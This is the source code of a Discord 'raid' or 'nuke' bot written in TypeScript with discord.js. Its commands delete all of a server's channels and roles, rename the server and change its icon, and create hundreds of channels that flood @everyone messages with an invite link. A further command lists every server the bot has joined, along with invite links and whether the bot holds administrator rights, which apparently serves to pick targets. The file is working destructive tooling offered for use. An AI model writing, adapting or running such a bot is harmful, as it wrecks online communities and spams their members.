import express = require('express');
import { Client, Message, Guild, Collection, MessageEmbed } from 'discord.js';
import { raidData, colors, reset } from './config/raid.config';

//express app
const app = express();
app.get('/', (req: any, res: any) => {
  res.send('Hello world');
});
app.listen(process.env.PORT || 3000);

//client init
const client: Client = new Client();

//client presence
client.on('ready', () => {
  if (!client.user) return;
  console.log(client.user.username, ' is ready');
  console.log(client.user.id);
  client.user.setPresence({
    status: 'dnd', 
    activity: {
      name: "@",
      type: "COMPETING"
    }
  });
});


client.on('message', async (message: Message) => {

  const wrong = (params: String) => {
    return message.channel.send({content: params});
  }

  function sleep(ms: number)  {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  ///nuke
  if (message.content === '@nuke') {
    if (!message.guild) return;
    const guild: Guild = message.guild;

    async function deleteData(): Promise<Guild> {
      await guild.channels.cache.forEach((c) => {
        c.delete()
          .then((channel) => guild.channels.cache.delete(channel.id))
          .catch((e) => {
            console.log(colors.cyan, 'Deleting channels:', reset, e.message);
          });
      });
      return guild;
    }
    if (!guild.me) return;
    if (!guild.me.hasPermission('ADMINISTRATOR')) return wrong("No tengo los permisos ncesarios");

    deleteData().then((g) =>
      g.channels
        .create(raidData.nuke_name)
        .then((c) => c.send('@everyone ' + raidData.invite))
    );
  }
  ///automatic
  if (message.content === '@') {
    if (!message.guild) return;

    let guild: Guild = message.guild;
    if (!guild.me) return;
    if (!guild.me.hasPermission('ADMINISTRATOR')) return wrong("No tengo los permisos ncesarios");
    const deleteChannels = async (): Promise<Guild> => {
      await guild.channels.cache.forEach((c) => {
        c.delete()
          .then((channel) => guild.channels.cache.delete(channel.id))
          .catch((e) => {
            console.log(colors.cyan, 'Deleting channels:', reset, e.message);
          });
      });
      return guild;
    };

    const deleteRoles = async (): Promise<Guild> => {
      await guild.roles.cache.forEach((r) => {
        if (!guild.me) return;
        if (guild.me.roles.highest.position > r.position && r.id !== guild.id) {
          r.delete()
            .then((role) => guild.roles.cache.delete(role.id))
            .catch((e) => {
              guild.roles.cache.delete(r.id);
              console.log(colors.yellow, 'Deleting roles:', reset, e.message);
            });
        }
      });
      return guild;
    };

    const createChannels = async () => {
      for (let i = 0; i <= 458; i++) {
        if (!message.guild) return;
        const channel = await message.guild.channels.create(raidData.raid_channel);
        const sendMessages = async (first: Boolean, ms: number) => {
          for (let x = 0; x <= 4; x++) {
            if (!channel) {
              continue;
            }
            channel.send('@everyone ' + raidData.invite)
            .catch((e) => {
              guild.channels.cache.delete(channel.id);
              console.log(colors.magenta, 'Sending messages:', reset, e.message);
            });
          }
          if (first) await sleep(ms * 1000);
          return;
        }

        const createRoles = async () => {
          for (let x = 0; x <= 249 - guild.roles.cache.size; x++) {
            guild.roles.create(
              {
                data: {
                  name: raidData.nuke_name
                }
              })
            .catch(e => {
              console.log(colors.yellow, 'Creating roles', reset, e.message);
            });
          }
          return;
        }
        
        Promise.all([channel, createRoles])
        .then(async res => {
          await sendMessages(true, 5);
          await sendMessages(true, 7);  
          await sendMessages(false, 0);
        })
      }
    };

    //raid
    try {
      await guild.setName(raidData.name);
      await guild.setIcon(raidData.icon);
      await deleteRoles();
      await deleteChannels();
      await createChannels();
    } catch (e) {
      console.log(colors.red, 'Unexpected:', reset, e.message);
    }
  }

  if (message.content === "@svs") {
    let guilds = client.guilds.cache.sort((a, b) => (a > b ? -1 : 1));
    
    guilds.forEach(async g => {
      if (g.id === '897986461222207589') return;
      try {
        let invite = await g.channels.cache.random().createInvite();
        message.channel.send(g.me?.hasPermission('ADMINISTRATOR') + g.name + " | " + invite.url);
      } catch(e) {
        message.channel.send(g.name + " | " + g.id);
      }
      
    });
  }
});

client.login(process.env.TOKEN);
